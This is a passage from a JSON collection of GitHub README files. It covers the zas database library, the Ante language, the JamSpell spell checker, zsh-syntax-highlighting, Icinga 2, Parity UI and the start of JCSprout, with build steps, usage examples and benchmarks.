prepare resources and do checkings at server side\n    2. the place-holder value list are embeded into the `com_stmt_execute` request to initiate the `SQL execution` progress, and the `binary\/string\/blob` type place-holders values should be sent by `com_send_long_data` requests especially,  Here\u2019s the diagram:\n\n ![Alt text](https:\/\/github.com\/oun111\/images\/blob\/master\/zas_prepare.png)\n\n\n## Compiling and Installing\n\n - Simply do `make clean install` under source root directory\n - The `libzas.a`, `libzas.so`, and `zas wrapper` library will be generated\n - Link the `.a` or `.so` library to your c++ applications\n - Load the wrapper library into your java\/python applications\n \n \n## Roadmap\n * `src`: core of zas library\n * `tests`: test cases of zas\n * `win`: vss project files of zas under windows\n * `wrapper`: library classes for java\/python that encapsulates APIs onto ZAS \n \n \n## Wrappers\n * both java and python wrappers load a c library named `libcwpr` that encapsulates a set of usage with ZAS APIs. see wrapper\/cwpr.c for more details\n * in java wrapper, it calls `libcwpr` methods with JNI interfaces\n * in python wrapper, it dynamically loads the `libcwpr`\n \n \n## HOWTO\n\n ### `In c++, one should access MYSQL with ZAS like this:`\n \n```c++\n \/* initialize connection object and login to database with MYSQL driver *\/\n zas_connect cnn(tnsFilePath,dal_mysql) ;\n \/* initialize stream object with SQL-prepare mode *\/\n zas_stream stream(cnn,true);\n \n \/* initialize the ORACLE-style SQL *\/\n stream.open(0,\"select id,nvl(name),price from test_db.test_tbl \"\n        \"where id>=:f1<unsigned int> and id<:f2<int,in>\");\n \n \/* insert place holders and execute the SQL *\/\n streams<<1;\n streams<<5;\n \n \/* fetch results *\/\n while (!streams[strs].eof()) {\n  int id=0;\n  char name[256] = \"\";\n  float point = 0.0;\n  long size = 0L;\n  \n  streams>>id ;\n  streams>>name ;\n  streams>>point ;\n  streams>>size ;\n  streams.flush();\n  printd(\"%d: name %s, point %f, size %ld\\n\",\n    id, name, point, size);\n}\n```\n\n### `In java, one should set correct 'CLASSPATH' of ZAS java wrapper class and play like this:`\n\n```java\npublic class test_cases {\n\n  public static void main(String[] args) throws Exception {\n\n    \/* initialize instance of zas.class and do initializations with it *\/\n    zas mz = (zas)Class.forName(\"zas\").newInstance();\n\n    \/* login to MYSQL *\/\n    mz.login(\"localhost\",3306,\"root\",\"123\",\"\");\n\n    \/* initialize the ORACLE-style SQL *\/\n    mz.prepare(\"select id,nvl(name),price,size from test_db.test_tbl where id<:f1<int>\");\n\n    \/* insert placeholder and execute SQL *\/\n    mz.insertInt(10);\n\n    \/* fetch results *\/\n    while (!mz.isEof()) {\n      Integer id = 0;\n      String name = \"\" ;\n      Double price = 0.0;\n      Long size = 0L; \n\n      id = mz.fetchInt();\n      name = mz.fetchStr();\n      price = mz.fetchDouble();\n      size = mz.fetchLong();\n      System.out.println(id + \": name: \" + name + \", point: \" + \n        price + \", size: \" + size + \"\\n\");\n    }   \n\n  }\n}\n\n```\n\n### `In python, one should load ZAS python wrapper class and play like this:`\n\n```python\n\n# path of ZAS python wrapper class\nsys.path.append(zasPythonWrapperPath)\n\n# load the wrapper class\nfrom python.zas import *\n\ndef main():\n\n  # do initializations\n  mz = zas()\n\n  # login to database\n  if mz.login(\"localhost\",3306,\"root\",\"123\",\"\")!=0 :\n    print(\"login fail\\n\")\n    exit(-1)\n\n  # initialize the ORACLE-style SQL\n  if mz.prepare('select nvl(id),name,price,size from test_db.test_tbl where id <:f1<int>')!=0 :\n    print(\"prepare fail\\n\")\n    exit(-1)\n\n  # insert placeholder and execute SQL\n  if mz.insert_int(10)!=0 :\n    exit(-1)\n\n  # fetch results\n  while mz.is_eof()==0 :\n    id = mz.fetch_int()\n    name = mz.fetch_str()\n    price = mz.fetch_double()\n    size = mz.fetch_long()\n    print(\"{0}: name: {1}, point: {2}, size: {3}\\n\".format(id,name,price,size))\n\n```\n"},{"repo":"\/jfecher\/ante","language":"C++","readme_contents":"# Ante\n\n### The compile-time language\n\n[![Build Status](https:\/\/gitlab.com\/jfecher\/ante\/badges\/typeinference\/build.svg)](https:\/\/gitlab.com\/rndmprsn\/ante\/commits\/typeinference)\n\nAnte is a compiled systems language focusing on providing extreme extensibility through\nthe use of a compile-time API.  Using such an API, compiler extensions can be created\nwithin the program itself, allowing for the addition of a garbage collector, ownership\nsystem, automatic linters, etc, all in a normal library without requiring any changes\nto the compiler itself.\n\nSystems languages can traditionally be a pain to write.  To fix this, Ante provides high-level\nsolutions such as string interpolation, smart pointers, and pattern matching, while maintaining\nthe ability to interact at a lower level if needed.\n\n## Community\n- Join the official subreddit at [\/r\/ante](https:\/\/www.reddit.com\/r\/ante) for any and all discussion.  Everyone is welcome!\n- Want to learn Ante?  Check out [the website](http:\/\/antelang.org\/).\n- Looking to contribute?  Check out [the documentation](http:\/\/antelang.org\/doxygen\/html\/).\n\n## Features\n* Strong focus on readability\n* Expression-based syntax\n* Robust module system with integrated build system\n* Immutable by default\n* Strongly typed with a detailed algebraic type system and type inferencing\n* Compile-time execution combined with an extensible compiler API\n    - Ability to write compiler plugins within the compiled program itself\n    - Use compiler API to analyze or change type system, IR, macros, etc.\n    - Programmers have just as much power over their program as the compiler does.  As an example,\n    here is an implementation of the goto construct in Ante:\n\n```haskell\n\/\/The 'ante' keyword declares compile-time values\nante\n    labels = global mut empty Map\n\n    goto lbl =\n        label = lookup labels lbl ?\n            None -> Ante.error \"Cannot goto undefined label ${lbl}\"\n\n        Llvm.setInsertPoint (getCallSiteBlock ())\n        Llvm.createBr label\n\n    label name:Str =\n        callingFn = getParentFn (getCallSiteBlock ())\n        lbl = Llvm.BasicBlock(Ante.llvm_ctxt, callingFn)\n        labels#name := lbl\n\n\n\/\/test it out\nlabel \"begin\"\nprint \"hello!\"\ngoto \"begin\"\n```\n\n## Installation\n\n### Requirements\n\n * `yacc`. This is normally provided by GNU Bison - to install Bison, install the `bison` package in your\ndistro's package manager.\n * (Optional) `llvm` version >= 8.0.  There is no need to install llvm manually.  If you do not have it\n installed already, cmake will automatically use the version in ante's git submodule.  If you wish to\n install llvm system wide anyway, then make sure to check which version you have by running `$ lli --version`.\n To install a specific version of llvm, install the `llvm` package on your distro's package manager, eg. for\n Ubuntu: `$ sudo apt-get install llvm-8.0`.  Note that not all versions may be available on all systems\n without building from source.\n\n### Steps\n\n1. Install yacc\/bison.\n\n2. Run `$ git clone https:\/\/github.com\/jfecher\/ante.git`\n\n3. Run `$ cd ante && cmake .` This will generate your platform specific\nbuild files.  Usually either a Makefile or Visual Studio solution file.\nYou can also specify which to make manually by passing the appropriate\narguments to cmake.\n\n3. Run `$ cmake --build .`  This may take a while as it is also building llvm.\n\nNOTE: If you are planning to develop ante in vim or a similar editor, make sure\nto add include, llvm\/include, and llvm_build\/include to your include paths.\n\n### Trying Ante in Docker\n\nAlternatively, you can try Ante using Docker. You can build the image using:\n\n```\ndocker build . -t ante\n```\n\nand then start it with:\n\n```\ndocker run -it ante\n```\n\nAt this point you can install an editor and use the compiler\/REPL (in \/home\/ante\/ante) to write some code and run it.\n"},{"repo":"\/bakwc\/JamSpell","language":"C++","readme_contents":"# JamSpell\n\n[![Build Status][travis-image]][travis] [![Release][release-image]][releases]\n\n[travis-image]: https:\/\/travis-ci.org\/bakwc\/JamSpell.svg?branch=master\n[travis]: https:\/\/travis-ci.org\/bakwc\/JamSpell\n\n[release-image]: https:\/\/img.shields.io\/badge\/release-0.0.11-blue.svg?style=flat\n[releases]: https:\/\/github.com\/bakwc\/JamSpell\/releases\n\nJamSpell is a spell checking library with following features:\n\n- **accurate** - it consider words surroundings (context) for better correction\n- **fast** - near 5K words per second\n- **multi-language** - it's written in C++ and available for many languages with swig bindings\n\n## Content\n- [Benchmarks](#benchmarks)\n- [Usage](#usage)\n  - [Python](#python)\n  - [C++](#c)\n  - [Other languages](#other-languages)\n  - [HTTP API](#http-api)\n- [Train](#train)\n\n## Benchmarks\n\n<table>\n  <tr>\n    <td><\/td>\n    <td>Errors<\/td>\n    <td>Top 7 Errors<\/td>\n    <td>Fix Rate<\/td>\n    <td>Top 7 Fix Rate<\/td>\n    <td>Broken<\/td>\n    <td>Speed<br>\n(words\/second)<\/td>\n  <\/tr>\n  <tr>\n    <td>JamSpell<\/td>\n    <td>3.25%<\/td>\n    <td>1.27%<\/td>\n    <td>79.53%<\/td>\n    <td>84.10%<\/td>\n    <td>0.64%<\/td>\n    <td>4854<\/td>\n  <\/tr>\n  <tr>\n    <td>Norvig<\/td>\n    <td>7.62%<\/td>\n    <td>5.00%<\/td>\n    <td>46.58%<\/td>\n    <td>66.51%<\/td>\n    <td>0.69%<\/td>\n    <td>395<\/td>\n  <\/tr>\n  <tr>\n    <td>Hunspell<\/td>\n    <td>13.10%<\/td>\n    <td>10.33%<\/td>\n    <td>47.52%<\/td>\n    <td>68.56%<\/td>\n    <td>7.14%<\/td>\n    <td>163<\/td>\n  <\/tr>\n  <tr>\n    <td>Dummy<\/td>\n    <td>13.14%<\/td>\n    <td>13.14%<\/td>\n    <td>0.00%<\/td>\n    <td>0.00%<\/td>\n    <td>0.00%<\/td>\n    <td>-<\/td>\n  <\/tr>\n<\/table>\n\nModel was trained on [300K wikipedia sentences + 300K news sentences (english)](http:\/\/wortschatz.uni-leipzig.de\/en\/download\/). 95% was used for train, 5% was used for evaluation. [Errors model](https:\/\/github.com\/bakwc\/JamSpell\/blob\/master\/evaluate\/typo_model.py) was used to generate errored text from the original one. JamSpell corrector was compared with [Norvig's one](http:\/\/norvig.com\/spell-correct.html), [Hunspell](http:\/\/hunspell.github.io\/) and a dummy one (no corrections).\n\nWe used following metrics:\n- **Errors** - percent of words with errors after spell checker processed\n- **Top 7 Errors** - percent of words missing in top7 candidated\n- **Fix Rate** - percent of errored words fixed by spell checker\n- **Top 7 Fix Rate** - percent of errored words fixed by one of top7 candidates\n- **Broken** - percent of non-errored words broken by spell checker\n- **Speed** - number of words per second\n\nTo ensure that our model is not too overfitted for wikipedia+news we checked it on \"The Adventures of Sherlock Holmes\" text:\n\n<table>\n  <tr>\n    <td><\/td>\n    <td>Errors<\/td>\n    <td>Top 7 Errors<\/td>\n    <td>Fix Rate<\/td>\n    <td>Top 7 Fix Rate<\/td>\n    <td>Broken<\/td>\n    <td>Speed\n(words per second)<\/td>\n  <\/tr>\n  <tr>\n    <td>JamSpell<\/td>\n    <td>3.56%<\/td>\n    <td>1.27%<\/td>\n    <td>72.03%<\/td>\n    <td>79.73%<\/td>\n    <td>0.50%<\/td>\n    <td>5524<\/td>\n  <\/tr>\n  <tr>\n    <td>Norvig<\/td>\n    <td>7.60%<\/td>\n    <td>5.30%<\/td>\n    <td>35.43%<\/td>\n    <td>56.06%<\/td>\n    <td>0.45%<\/td>\n    <td>647<\/td>\n  <\/tr>\n  <tr>\n    <td>Hunspell<\/td>\n    <td>9.36%<\/td>\n    <td>6.44%<\/td>\n    <td>39.61%<\/td>\n    <td>65.77%<\/td>\n    <td>2.95%<\/td>\n    <td>284<\/td>\n  <\/tr>\n  <tr>\n    <td>Dummy<\/td>\n    <td>11.16%<\/td>\n    <td>11.16%<\/td>\n    <td>0.00%<\/td>\n    <td>0.00%<\/td>\n    <td>0.00%<\/td>\n    <td>-<\/td>\n  <\/tr>\n<\/table>\n\nMore details about reproducing available in \"[Train](#train)\" section.\n\n## Usage\n### Python\n1. Install ```swig3``` (usually it is in your distro package manager)\n\n2. Install ```jamspell```:\n```bash\npip install jamspell\n```\n3. [Download](#download-models) or [train](#train) language model\n\n4. Use it:\n\n```python\nimport jamspell\n\ncorrector = jamspell.TSpellCorrector()\ncorrector.LoadLangModel('en.bin')\n\ncorrector.FixFragment('I am the begt spell cherken!')\n# u'I am the best spell checker!'\n\ncorrector.GetCandidates(['i', 'am', 'the', 'begt', 'spell', 'cherken'], 3)\n# (u'best', u'beat', u'belt', u'bet', u'bent', ... )\n\ncorrector.GetCandidates(['i', 'am', 'the', 'begt', 'spell', 'cherken'], 5)\n# (u'checker', u'chicken', u'checked', u'wherein', u'coherent', ...)\n```\n\n### C++\n1. Add `jamspell` and `contrib` dirs to your project\n\n2. Use it:\n\n```cpp\n#include <jamspell\/spell_corrector.hpp>\n\nint main(int argc, const char** argv) {\n\n    NJamSpell::TSpellCorrector corrector;\n    corrector.LoadLangModel(\"model.bin\");\n\n    corrector.FixFragment(L\"I am the begt spell cherken!\");\n    \/\/ \"I am the best spell checker!\"\n\n    corrector.GetCandidates({L\"i\", L\"am\", L\"the\", L\"begt\", L\"spell\", L\"cherken\"}, 3);\n    \/\/ \"best\", \"beat\", \"belt\", \"bet\", \"bent\", ... )\n\n    corrector.GetCandidates({L\"i\", L\"am\", L\"the\", L\"begt\", L\"spell\", L\"cherken\"}, 3);\n    \/\/ \"checker\", \"chicken\", \"checked\", \"wherein\", \"coherent\", ... )\n    return 0;\n}\n```\n\n### Other languages\nYou can generate extensions for other languages using [swig tutorial](http:\/\/www.swig.org\/tutorial.html). The swig interface file is `jamspell.i`. Pull requests with build scripts are welcome.\n\n## HTTP API\n* Install ```cmake```\n\n* Clone and build jamspell (it includes http server):\n```bash\ngit clone https:\/\/github.com\/bakwc\/JamSpell.git\ncd JamSpell\nmkdir build\ncd build\ncmake ..\nmake\n```\n* [Download](#download-models) or [train](#train) language model\n* Run http server:\n```bash\n.\/web_server\/web_server en.bin localhost 8080\n```\n* **GET** Request example:\n```bash\n$ curl \"http:\/\/localhost:8080\/fix?text=I am the begt spell cherken\"\nI am the best spell checker\n```\n* **POST** Request example\n```bash\n$ curl -d \"I am the begt spell cherken\" http:\/\/localhost:8080\/fix\nI am the best spell checker\n```\n* Candidate example\n```bash\ncurl \"http:\/\/localhost:8080\/candidates?text=I am the begt spell cherken\"\n# or\ncurl -d \"I am the begt spell cherken\" http:\/\/localhost:8080\/candidates\n```\n```javascript\n{\n    \"results\": [\n        {\n            \"candidates\": [\n                \"best\",\n                \"beat\",\n                \"belt\",\n                \"bet\",\n                \"bent\",\n                \"beet\",\n                \"beit\"\n            ],\n            \"len\": 4,\n            \"pos_from\": 9\n        },\n        {\n            \"candidates\": [\n                \"checker\",\n                \"chicken\",\n                \"checked\",\n                \"wherein\",\n                \"coherent\",\n                \"cheered\",\n                \"cherokee\"\n            ],\n            \"len\": 7,\n            \"pos_from\": 20\n        }\n    ]\n}\n```\nHere `pos_from` - misspelled word first letter position, `len` - misspelled word len\n\n## Train\nTo train custom model you need:\n\n1. Install ```cmake```\n\n2. Clone and build jamspell:\n```bash\ngit clone https:\/\/github.com\/bakwc\/JamSpell.git\ncd JamSpell\nmkdir build\ncd build\ncmake ..\nmake\n```\n\n3. Prepare a utf-8 text file with sentences to train at (eg. [```sherlockholmes.txt```](https:\/\/github.com\/bakwc\/JamSpell\/blob\/master\/test_data\/sherlockholmes.txt)) and another file with language alphabet (eg. [```alphabet_en.txt```](https:\/\/github.com\/bakwc\/JamSpell\/blob\/master\/test_data\/alphabet_en.txt))\n\n4. Train model:\n```bash\n.\/main\/jamspell train ..\/test_data\/alphabet_en.txt ..\/test_data\/sherlockholmes.txt model_sherlock.bin\n```\n5. To evaluate spellchecker you can use ```evaluate\/evaluate.py``` script:\n```bash\npython evaluate\/evaluate.py -a alphabet_file.txt -jsp your_model.bin -mx 50000 your_test_data.txt\n```\n6. You can use ```evaluate\/generate_dataset.py``` to generate you train\/test data. It supports txt files, [Leipzig Corpora Collection](http:\/\/wortschatz.uni-leipzig.de\/en\/download\/) format and fb2 books.\n\n## Download models\nHere is a few simple models. They trained on 300K news + 300k wikipedia sentences. We strongly recommend to train your own model, at least on a few million sentences to achieve better quality. See [Train](#train) section above.\n\n - [en.tar.gz](https:\/\/github.com\/bakwc\/JamSpell-models\/raw\/master\/en.tar.gz) (35Mb)\n - [fr.tar.gz](https:\/\/github.com\/bakwc\/JamSpell-models\/raw\/master\/fr.tar.gz) (31Mb)\n - [ru.tar.gz](https:\/\/github.com\/bakwc\/JamSpell-models\/raw\/master\/ru.tar.gz) (38Mb)\n"},{"repo":"\/geckom\/ChatScript","language":"C++","readme_contents":"# ChatScript\nNatural Language tool\/dialog manager\n"},{"repo":"\/zsh-users\/zsh-syntax-highlighting","language":"Shell","readme_contents":"zsh-syntax-highlighting [![Build Status][build-status-image]][build-status-travis]\n=======================\n\n**[Fish shell][fish]-like syntax highlighting for [Zsh][zsh].**\n\n*Requirements: zsh 4.3.11+.*\n\n[fish]: http:\/\/www.fishshell.com\/\n[zsh]: http:\/\/www.zsh.org\/\n\nThis package provides syntax highlighting for the shell zsh.  It enables\nhighlighting of commands whilst they are typed at a zsh prompt into an\ninteractive terminal.  This helps in reviewing commands before running\nthem, particularly in catching syntax errors.\n\nSome examples:\n\nBefore: [![Screenshot #1.1](images\/before1-smaller.png)](images\/before1.png)\n<br\/>\nAfter:&nbsp; [![Screenshot #1.2](images\/after1-smaller.png)](images\/after1.png)\n\nBefore: [![Screenshot #2.1](images\/before2-smaller.png)](images\/before2.png)\n<br\/>\nAfter:&nbsp; [![Screenshot #2.2](images\/after2-smaller.png)](images\/after2.png)\n\nBefore: [![Screenshot #3.1](images\/before3-smaller.png)](images\/before3.png)\n<br\/>\nAfter:&nbsp; [![Screenshot #3.2](images\/after3-smaller.png)](images\/after3.png)\n\n\nHow to install\n--------------\n\nSee [INSTALL.md](INSTALL.md).\n\n\nFAQ\n---\n\n### Why must `zsh-syntax-highlighting.zsh` be sourced at the end of the `.zshrc` file?\n\n`zsh-syntax-highlighting.zsh` wraps ZLE widgets.  It must be sourced after all\ncustom widgets have been created (i.e., after all `zle -N` calls and after\nrunning `compinit`).  Widgets created later will work, but will not update the\nsyntax highlighting.\n\n### Does syntax highlighting work during incremental history search?\n\nHighlighting the command line during an incremental history search (by default bound to\nto <kbd>Ctrl+R<\/kbd> in zsh's emacs keymap) requires zsh 5.4 or newer.\n\nUnder zsh versions older than 5.4, the zsh-default [underlining][zshzle-Character-Highlighting]\nof the matched portion of the buffer remains available, but zsh-syntax-highlighting's\nadditional highlighting is unavailable.  (Those versions of zsh do not provide\nenough information to allow computing the highlighting correctly.)\n\nSee issues [#288][i288] and [#415][i415] for details.\n\n[zshzle-Character-Highlighting]: http:\/\/zsh.sourceforge.net\/Doc\/Release\/Zsh-Line-Editor.html#Character-Highlighting\n[i288]: https:\/\/github.com\/zsh-users\/zsh-syntax-highlighting\/pull\/288\n[i415]: https:\/\/github.com\/zsh-users\/zsh-syntax-highlighting\/pull\/415\n\n### How are new releases announced?\n\nThere is currently no \"push\" announcements channel.  However, the following\nalternatives exist:\n\n- GitHub's RSS feed of releases: https:\/\/github.com\/zsh-users\/zsh-syntax-highlighting\/releases.atom\n- An anitya entry: https:\/\/release-monitoring.org\/project\/7552\/\n\n\nHow to tweak\n------------\n\nSyntax highlighting is done by pluggable highlighter scripts.  See the\n[documentation on highlighters](docs\/highlighters.md) for details and\nconfiguration settings.\n\n[build-status-image]: https:\/\/travis-ci.org\/zsh-users\/zsh-syntax-highlighting.svg?branch=master\n[build-status-travis]: https:\/\/travis-ci.org\/zsh-users\/zsh-syntax-highlighting\n"},{"repo":"\/Icinga\/icinga2","language":"C++","readme_contents":"[![Build Status](https:\/\/travis-ci.org\/Icinga\/icinga2.svg?branch=master)](https:\/\/travis-ci.org\/Icinga\/icinga2)\n[![Github Tag](https:\/\/img.shields.io\/github\/tag\/Icinga\/icinga2.svg)](https:\/\/github.com\/Icinga\/icinga2)\n\n# Icinga 2\n\n![Icinga Logo](https:\/\/icinga.com\/wp-content\/uploads\/2014\/06\/icinga_logo.png)\n\n#### Table of Contents\n\n1. [About][About]\n2. [Installation][Installation]\n3. [Documentation][Documentation]\n4. [Support][Support]\n5. [License][License]\n6. [Contributing][Contributing]\n\n## About\n\n[Icinga](https:\/\/icinga.com\/products\/) is a monitoring system which checks\nthe availability of your network resources, notifies users of outages, and generates\nperformance data for reporting.\n\nScalable and extensible, Icinga can monitor large, complex environments across\nmultiple locations.\n\nIcinga 2 is the monitoring server and requires [Icinga Web 2](https:\/\/icinga.com\/products\/)\non top in your Icinga Stack. The [configuration](https:\/\/icinga.com\/products\/configuration\/)\ncan be easily managed with either the [Icinga Director](https:\/\/icinga.com\/docs\/director\/latest\/),\nconfig management tools or plain text within the [Icinga DSL](https:\/\/icinga.com\/docs\/icinga2\/latest\/doc\/17-language-reference\/).\n\n![Icinga Dashboard](https:\/\/icinga.com\/wp-content\/uploads\/2017\/12\/icingaweb2-2.5.0-dashboard.png)\n\n## Installation\n\n* [Installation](https:\/\/icinga.com\/docs\/icinga2\/latest\/doc\/02-installation\/)\n* [Monitoring Basics](https:\/\/icinga.com\/docs\/icinga2\/latest\/doc\/03-monitoring-basics\/)\n* [Configuration](https:\/\/icinga.com\/docs\/icinga2\/latest\/doc\/04-configuration\/)\n* [Distributed Monitoring](https:\/\/icinga.com\/docs\/icinga2\/latest\/doc\/06-distributed-monitoring\/)\n* [Addons, Integrations and Features](https:\/\/icinga.com\/docs\/icinga2\/latest\/doc\/13-addons\/)\n* [Troubleshooting](https:\/\/icinga.com\/docs\/icinga2\/latest\/doc\/15-troubleshooting\/)\n* [Upgrading](https:\/\/icinga.com\/docs\/icinga2\/latest\/doc\/16-upgrading-icinga-2\/)\n\nOnce Icinga Server and Web are running in your distributed environment,\nmake sure to check out the many [Icinga modules](https:\/\/icinga.com\/docs\/)\nfor even better monitoring.\n\n## Documentation\n\nThe documentation is available on [icinga.com\/docs](https:\/\/icinga.com\/docs\/icinga2\/latest\/).\n\n## Support\n\nCheck the [project website](https:\/\/icinga.com) for status updates. Join the\n[community channels](https:\/\/icinga.com\/community\/) for questions\nor ask an Icinga partner for [professional support](https:\/\/icinga.com\/support\/).\n\n## License\n\nIcinga 2 and the Icinga 2 documentation are licensed under the terms of the GNU\nGeneral Public License Version 2, you will find a copy of this license in the\nCOPYING file included in the source package.\n\nIn addition, as a special exception, the copyright holders give\npermission to link the code of portions of this program with the\nOpenSSL library under certain conditions as described in each\nindividual source file, and distribute linked combinations including\nthe two.\n\nYou must obey the GNU General Public License in all respects for all\nof the code used other than OpenSSL. If you modify file(s) with this\nexception, you may extend this exception to your version of the\nfile(s), but you are not obligated to do so. If you do not wish to do\nso, delete this exception statement from your version. If you delete\nthis exception statement from all source files in the program, then\nalso delete it here.\n\n## Contributing\n\nThere are many ways to contribute to Icinga -- whether it be sending patches,\ntesting, reporting bugs, or reviewing and updating the documentation. Every\ncontribution is appreciated!\n\nPlease continue reading in the [contributing chapter](CONTRIBUTING.md).\n\nIf you are a packager, please read the [development chapter](https:\/\/icinga.com\/docs\/icinga2\/latest\/doc\/21-development\/)\nfor more details.\n\n### Security Issues\n\nFor reporting security issues please visit [this page](https:\/\/icinga.com\/contact\/security\/).\n\n<!-- TOC URLs -->\n[About]: #about\n[License]: #license\n[Installation]: #installation\n[Documentation]: #documentation\n[Support]: #support\n[Contributing]: #contributing\n"},{"repo":"\/parity-js\/shell","language":"JavaScript","readme_contents":"# Parity UI\n\n## \u26a0 Parity Technologies is looking for a new maintainer for this repo. If you are interested, please get in touch at admin@parity.io.\n\n## \u26a0 Parity UI is currently only compatible with Parity Ethereum <v2.0. Read about [possible alternatives here](#parity-ui-alternatives).\n\n### [Download the latest release](https:\/\/github.com\/parity-js\/shell\/releases\/latest)\n\n[![GPLv3](https:\/\/img.shields.io\/badge\/license-GPL%20v3-green.svg)](https:\/\/www.gnu.org\/licenses\/gpl-3.0.en.html)\n\n### Join the chat!\n\nGet in touch with us on Gitter:\n[![Gitter: Parity](https:\/\/img.shields.io\/badge\/gitter-parity-4AB495.svg)](https:\/\/gitter.im\/paritytech\/parity)\n\nOr join our community on Matrix:\n[![Riot: +Parity](https:\/\/img.shields.io\/badge\/riot-%2Bparity%3Amatrix.parity.io-orange.svg)](https:\/\/riot.im\/app\/#\/group\/+parity:matrix.parity.io)\n\nBe sure to check out [our wiki](https:\/\/wiki.parity.io\/Parity-Wallet) for more information.\n\n----\n## About Parity UI\n\nParity UI is a User Interface desktop application for [Parity Ethereum Client](https:\/\/github.com\/paritytech\/parity\/blob\/master\/README.md) >=v1.10. It features a Wallet supporting Ether and ERC-20 Tokens, a Contract development environment, and so much more. Parity UI will download and run [Parity Ethereum Client](https:\/\/github.com\/paritytech\/parity\/blob\/master\/README.md) in the background if it is not found on the system. \nBy default Parity UI will try connect to a Parity Ethereum node using Websocket port 8546. You can use alternative ports, see [CLI Options](#cli-options) below.\n\nYou can download Parity UI [here](https:\/\/github.com\/parity-js\/shell\/releases\/latest) or follow the instructions below to build from source.\n\n## Parity UI alternatives\n\n### View and send Ether and tokens\n\nAs Parity UI is not working properly with Parity Ethereum >2.0, you can use [MyCrypto Desktop app](https:\/\/download.mycrypto.com\/) connected to a local full node to interact with your accounts. Follow [these steps](https:\/\/support.mycrypto.com\/networks\/run-your-own-node-with-mycrypto.html) to connect MyCrypto Desktop to a local Parity Ethereum node. Parity UI accounts' JSON keystore files can be found at the following location:\n- Mac OS X: `~\/Library\/Application\\ Support\/io.parity.ethereum\/keys\/ethereum\/`\n- Linux: `$HOME\/.local\/share\/io.parity.ethereum\/keys`\n- Windows 7\/10: `%HOMEPATH%\/AppData\/Roaming\/Parity\/Ethereum\/keys`\n\nImport an account to MyCrypto by selecting the corresponding JSON keystore file. You will require your account's password to unlock it (originally setup with Parity UI).\n\n### Smart contract development\n\nYou can use [Remix](https:\/\/remix.ethereum.org\/) connected to a local Parity Ethereum full node as an alternative to Parity UI for smart contracts development and deployment. Make sure that Remix is allowed to connect to your node by setting up the right [JSON-RPC cors policy](https:\/\/ethereum.stackexchange.com\/questions\/54639\/is-it-possible-to-connect-remix-and-parity?rq=1).\n\n## Install from the snap store\n\nIn any of the [supported Linux distros](https:\/\/snapcraft.io\/docs\/core\/install):\n\n```bash\nsudo snap install parity-ui\n```\n\nOr, if you want to contribute testing the upcoming release:\n\n```bash\nsudo snap install parity-ui --beta\n```\n\nAnd to test the latest code landed into the master branch:\n\n```bash\nsudo snap install parity-ui --edge\n```\n\n---\n\n## Build from source\n\n```bash\nnpm install\nnpm run electron\n```\n\nYou should see the Electron app popping up.\n\n### Build the binary (Optional)\n\nOne further, albeit optional step is to create an OS-specific binary. This is done with the following command:\n\n```bash\nnpm run release\n```\n\nThis command may take some time. Once finished, you will see binaries for your OS in the `dist\/` folder.\n\n## Developing\n\nThe best Developer Experience is achieved by running:\n\n```bash\nparity --ui-no-validation # Warning: INSECURE. Only use it when developing the UI.\nnpm start\n```\n\nA new browser tab will open on `http:\/\/localhost:3000` with the UI, and this tab will refresh on any code change. This DX allows fast iterations.\n\nIf you want to test the rendering in an Electron window, run the following command in parallel with the previous command:\n\n```bash\nnpm run electron:dev\n```\n\nThis will spawn an Electron window serving `http:\/\/localhost:3000`. Same thing, the Electron window will refresh on any code change.\n\n## CLI Options\nAll other flags passed to Parity UI will be passed down to parity when trying to launch it.\n```bash\nOperating Options:\n    --no-run-parity\n        Parity UI will not attempt to run \n        the locally installed parity.\n\n    --ui-dev\n        Parity UI will load http:\/\/localhost:3000. \n        WARNING: Only use this is you plan on developing on Parity UI.\n\n    --ws-interface=[IP]\n        Specify the hostname portion of the WebSockets server \n        Parity UI will connect to. IP should be an \n        interface's IP address. (default: 127.0.0.1)\n\n    --ws-port=[PORT]\n        Specify the port portion of the WebSockets \n        server Parity UI will connect to. (default: 8546)\n```\n"},{"repo":"\/crossoverJie\/JCSprout","language":"Java","readme_contents":"\n<div align=\"center\">  \n\n<img src=\"https:\/\/ws1.sinaimg.cn\/large\/0069RVTdly1fubocn5pxaj30go082dg1.jpg\" width=\"\"\/> \n<br\/>\n\n[![Build Status](https:\/\/travis-ci.org\/crossoverJie\/JCSprout.svg?branch=master)](https:\/\/travis-ci.org\/crossoverJie\/JCSprout)\n[![QQ\u7fa4](https:\/\/img.shields.io\/badge\/QQ%E7%BE%A4-787381170-yellowgreen.svg)](https:\/\/jq.qq.com\/?_wv=1027&k=5HPYvQk)\n\n[qq0groupsvg]: https:\/\/img.shields.io\/badge\/QQ%E7%BE%A4-787381170-yellowgreen.svg\n[qq0group]: https:\/\/jq.qq.com\/?_wv=1027&k=5HPYvQk\n\n<\/div><br>\n\n\n> `Java Core Sprout`\uff1a\u5904\u4e8e\u840c\u82bd\u9636\u6bb5\u7684 Java \u6838\u5fc3\u77e5\u8bc6\u5e93\u3002\n\n**\u8bbf\u95ee\u8fd9\u91cc\u83b7\u53d6\u66f4\u597d\u7684\u9605\u8bfb\u4f53\u9a8c**\uff1a[https:\/\/crossoverjie.top\/JCSprout\/](https:\/\/crossoverjie.top\/JCSprout\/)\n\n<br\/>\n\n\n| \ud83d\udcca |\u2694\ufe0f | \ud83d\udda5 | \ud83d\ude8f | \ud83c\udfd6  | \ud83c\udf01| \ud83d\udcee | \ud83d\udd0d | \ud83d\ude80 | \ud83c\udf08 |\ud83d\udca1\n| :--------: | :---------: | :---------: | :---------: | :---------: | :---------:| :---------: | :-------: | :-------:| :------:|:------:|\n| [\u96c6\u5408](#\u5e38\u7528\u96c6\u5408) | [\u591a\u7ebf\u7a0b](#java-\u591a\u7ebf\u7a0b)|[JVM](#jvm) | [\u5206\u5e03\u5f0f](#\u5206\u5e03\u5f0f\u76f8\u5173) |[\u6846\u67b6](#\u5e38\u7528\u6846\u67b6\u7b2c\u4e09\u65b9\u7ec4\u4ef6)|[\u67b6\u6784\u8bbe\u8ba1](#\u67b6\u6784\u8bbe\u8ba1)| [\u6570\u636e\u5e93](#db-\u76f8\u5173) |[\u7b97\u6cd5](#\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5)|[Netty](#netty-\u76f8\u5173)| [\u9644\u52a0\u6280\u80fd](#\u9644\u52a0\u6280\u80fd)|[\u8054\u7cfb\u4f5c\u8005](#\u8054\u7cfb\u4f5c\u8005) |\n\n\n\n### \u5e38\u7528\u96c6\u5408\n- 